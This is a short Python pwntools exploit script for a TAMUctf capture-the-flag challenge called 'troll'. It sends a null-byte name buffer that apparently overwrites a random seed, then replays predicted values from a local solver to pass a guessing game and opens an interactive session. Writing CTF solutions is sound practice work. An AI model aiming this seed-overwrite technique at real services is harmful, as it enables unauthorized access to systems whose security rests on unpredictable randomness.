from pwn import *
import sys

#import kmpwn
sys.path.append('/home/vagrant/kmpwn')
from kmpwn import *
#fsb(width, offset, data, padding, roop)

#config
context(os='linux', arch='i386')
context.log_level = 'debug'

FILE_NAME = "./troll"
HOST = "challenges.tamuctf.com"
PORT = 4765

if len(sys.argv) > 1 and sys.argv[1] == 'r':
	conn = remote(HOST, PORT)
else:
	conn = process(FILE_NAME)

#elf = ELF(FILE_NAME)
#libc = ELF('./')
#
#main_addr = elf.symbols["main"]
#libc_binsh = next(elf.search("/bin/sh"))
#addr_bss = elf.bss()
#addr_dynsym = elf.get_section_by_name('.dynsym').header['sh_addr']

def exploit():
	solver = process("./random")

	name = "\x00"*0x30
	name += p64(0)
	name += p64(0)
	name += p64(0)
	name += p64(0)
	name += p64(0)
	conn.sendlineafter("there?\n", name)
	for i in range(0x64):
		s = solver.recvline()
		conn.sendlineafter("?\n", s)
	conn.interactive()	

if __name__ == "__main__":
	exploit()	
